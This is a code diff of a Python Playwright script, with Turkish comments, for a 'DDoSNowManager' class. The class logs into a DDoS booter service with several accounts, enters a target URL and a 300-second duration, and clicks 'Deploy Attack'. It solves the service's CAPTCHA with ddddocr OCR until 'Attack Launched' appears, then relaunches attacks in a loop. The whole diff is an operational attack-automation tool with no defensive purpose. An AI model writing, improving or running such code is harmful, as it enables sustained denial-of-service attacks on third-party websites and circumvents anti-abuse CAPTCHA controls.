@@ -8,7 +8,7 @@ import shutil
 import sys
 import logging
 from datetime import datetime
-from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout, expect
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 from PIL import Image
 import ddddocr
 import traceback
@@ -60,38 +60,9 @@ class DDoSNowManager:
                         logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
         return accounts
 
-    def wait_for_inputs(self, page, username, timeout=30000):
-        """Sayfadaki inputların yüklenmesini bekle"""
-        try:
-            # Önce en az 2 input olana kadar bekle
-            start_time = time.time()
-            while time.time() - start_time < timeout / 1000:
-                input_count = page.locator("input").count()
-                logger.info(f"[{username}] Sayfada {input_count} input var")
-                if input_count >= 3:  # host, time, captcha en az 3 input olmalı
-                    logger.info(f"[{username}] Tüm inputlar yüklendi!")
-                    return True
-                time.sleep(1)
-            return False
-        except Exception as e:
-            logger.error(f"[{username}] Input bekleme hatası: {e}")
-            return False
-
     def solve_captcha(self, page, username):
         """Captcha çöz - başarılı olana kadar dene"""
         try:
-            # Deploy butonuna tıkla
-            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
-            if deploy_btn.count() == 0:
-                deploy_btn = page.locator("button:has-text('Deploy Attack')").first
-            if deploy_btn.count() == 0:
-                logger.error(f"[{username}] Deploy butonu bulunamadı!")
-                return False
-                
-            deploy_btn.click()
-            logger.info(f"[{username}] Deploy butonuna tıklandı")
-            time.sleep(2)
-
             attempt = 0
             while True:
                 attempt += 1
@@ -132,15 +103,15 @@ class DDoSNowManager:
                     captcha_input.fill(captcha_text)
                     time.sleep(0.5)
 
-                    # Deploy butonuna tıkla
-                    deploy_btn2 = page.locator("button[type='submit'][form='hubForm']").first
-                    if deploy_btn2.count() == 0:
-                        deploy_btn2 = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
-                    if deploy_btn2.count() == 0:
+                    # Deploy butonuna tıkla (form='hubForm' olan)
+                    deploy_btn = page.locator("button[type='submit'][form='hubForm']").first
+                    if deploy_btn.count() == 0:
+                        deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
+                    if deploy_btn.count() == 0:
                         logger.error(f"[{username}] Deploy butonu bulunamadı!")
                         return False
                         
-                    deploy_btn2.click()
+                    deploy_btn.click()
                     time.sleep(2)
 
                     # Hata kontrolü
@@ -150,6 +121,7 @@ class DDoSNowManager:
                         time.sleep(1)
                         continue
                     
+                    # Başarılı mı?
                     if page.locator("text=Attack Launched").count() > 0:
                         logger.info(f"[{username}] DOĞRU captcha: {captcha_text} (deneme #{attempt}) - Attack başlatıldı!")
                         return True
@@ -233,14 +205,7 @@ class DDoSNowManager:
                         logger.info(f"[{username}] Hub sayfasına gidiliyor...")
                         page.goto(f"{self.base_url}/hub", timeout=60000)
                         page.wait_for_load_state("networkidle", timeout=30000)
-                        
-                        # Inputların yüklenmesini bekle
-                        if not self.wait_for_inputs(page, username):
-                            logger.error(f"[{username}] Inputlar yüklenmedi!")
-                            time.sleep(30)
-                            continue
-                        
-                        time.sleep(2)
+                        time.sleep(3)
                         
                         if "login" in page.url:
                             logger.error(f"[{username}] Giriş başarısız!")
@@ -261,10 +226,8 @@ class DDoSNowManager:
                             attack_count += 1
                             logger.info(f"[{username}] Attack #{attack_count} başlatılıyor...")
                             
-                            # ===== HEDEF URL =====
+                            # ===== ADIM 1: Hedef URL'yi gir =====
                             target_input = page.locator("input[name='hub.0.host']").first
-                            if target_input.count() == 0:
-                                target_input = page.locator("input[placeholder*='IPv4']").first
                             if target_input.count() == 0:
                                 logger.error(f"[{username}] Hedef URL input bulunamadı!")
                                 page.reload()
@@ -274,32 +237,43 @@ class DDoSNowManager:
                             target_input.fill(target_url, timeout=10000)
                             logger.info(f"[{username}] Hedef URL: {target_url}")
                             
-                            # ===== SÜRE - name="hub.0.time" =====
+                            # URL girdikten sonra süre inputunun açılmasını bekle
+                            time.sleep(2)
+                            
+                            # ===== ADIM 2: Süre inputunu bul ve 300 yaz =====
                             time_input = page.locator("input[name='hub.0.time']").first
                             if time_input.count() == 0:
+                                # Alternatif: number tipindeki input
                                 time_input = page.locator("input[type='number']").first
                             if time_input.count() == 0:
-                                # Tüm inputları dene
-                                all_inputs = page.locator("input").all()
-                                for inp in all_inputs:
-                                    try:
-                                        name = inp.get_attribute("name") or ""
-                                        if "time" in name.lower():
-                                            time_input = inp
-                                            break
-                                    except:
-                                        pass
-                            
-                            if time_input.count() == 0:
-                                logger.error(f"[{username}] Süre input bulunamadı! Sayfa yenileniyor...")
+                                logger.error(f"[{username}] Süre input bulunamadı!")
                                 page.reload()
-                                time.sleep(5)
+                                time.sleep(3)
                                 continue
                                 
+                            # Önce temizle sonra 300 yaz
+                            time_input.fill("")
+                            time.sleep(0.5)
                             time_input.fill("300", timeout=10000)
                             logger.info(f"[{username}] Süre: 300 saniye")
                             
-                            # ===== CAPTCHA ÇÖZ =====
+                            time.sleep(1)
+                            
+                            # ===== ADIM 3: Deploy Attack butonuna tıkla =====
+                            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
+                            if deploy_btn.count() == 0:
+                                deploy_btn = page.locator("button:has-text('Deploy Attack')").first
+                            if deploy_btn.count() == 0:
+                                logger.error(f"[{username}] Deploy butonu bulunamadı!")
+                                page.reload()
+                                time.sleep(3)
+                                continue
+                                
+                            deploy_btn.click()
+                            logger.info(f"[{username}] Deploy butonuna tıklandı")
+                            time.sleep(2)
+                            
+                            # ===== ADIM 4: CAPTCHA çöz =====
                             logger.info(f"[{username}] CAPTCHA çözülüyor...")
                             if not self.solve_captcha(page, username):
                                 logger.error(f"[{username}] CAPTCHA çözülemedi!")
@@ -309,7 +283,7 @@ class DDoSNowManager:
 
                             logger.info(f"[{username}] Attack başladı! - {target_url}")
                             
-                            # ===== SÜRE TAKİBİ =====
+                            # ===== ADIM 5: SÜRE TAKİBİ =====
                             while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                 try:
                                     badge = page.locator(".accordion-button .badge").first
@@ -331,6 +305,7 @@ class DDoSNowManager:
                             if not self.running_states.get(acc_id, False):
                                 break
 
+                            # ===== ADIM 6: Sayfayı yenile ve döngüye devam et =====
                             logger.info(f"[{username}] Sayfa yenileniyor...")
                             page.reload()
                             time.sleep(5)
@@ -341,6 +316,7 @@ class DDoSNowManager:
 
                         except Exception as inner_e:
                             logger.error(f"[{username}] İşlem hatası (Attack #{attack_count}): {inner_e}")
+                            logger.error(traceback.format_exc())
                             page.reload()
                             time.sleep(5)
                             continue
@@ -349,6 +325,7 @@ class DDoSNowManager:
 
             except Exception as outer_e:
                 logger.error(f"[{username}] KRİTİK HATA: {outer_e}")
+                logger.error(traceback.format_exc())
                 time.sleep(10)
                 continue
 
